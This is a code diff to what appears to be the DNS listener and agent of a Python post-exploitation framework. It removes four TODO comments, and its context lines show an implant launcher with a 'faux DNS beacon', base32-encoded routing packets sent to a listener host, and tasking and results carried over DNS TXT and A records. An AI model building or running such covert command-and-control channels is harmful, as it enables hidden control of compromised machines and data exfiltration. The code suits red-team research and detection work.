@@ -254,7 +254,6 @@ class Listener:
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
                 b32RoutingPacket = base64.b32encode(routingPacket)
 
-                # TODO: fix the EOF pkt
                 # create faux DNS beacon and receive response
                 launcherBase += "port='{}';".format(port)
                 launcherBase += "fake_domain='{}';".format(fake_domain)
@@ -499,7 +498,6 @@ def send_message(packets=None):
         # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
         #   meta TASKING_REQUEST = 4
         routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
-        # TODO need to check return value from below function call to see if IP addr is ipswitchatotxt addr
         ip_recv=send_data_to_listener_a(taskinghostname, sock, host, port, routingPacket, fake_domain)
     try:
         print "[AGENT] main control loop"
@@ -552,7 +550,6 @@ def send_message(packets=None):
         a_base32 = ""
         while True:
             data,server_dns=sock.recvfrom(512)
-            # TODO Change this to point to function to check if MX record recv'd
             a_dns = DNS(data)
             if self.is_eof_response(a_dns):
                 self.send_a_record_reply(sock, recv_hostname, ipeof, addr)
@@ -709,7 +706,6 @@ def send_message(packets=None):
         # TODO fix the counter
         offset = 0
 
-        # TODO change IP addr below
         self.send_txt_record_reply(sock, hostname, ipack, addr)
         
         dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, stager_crypto, listenerOptions, addr[0])
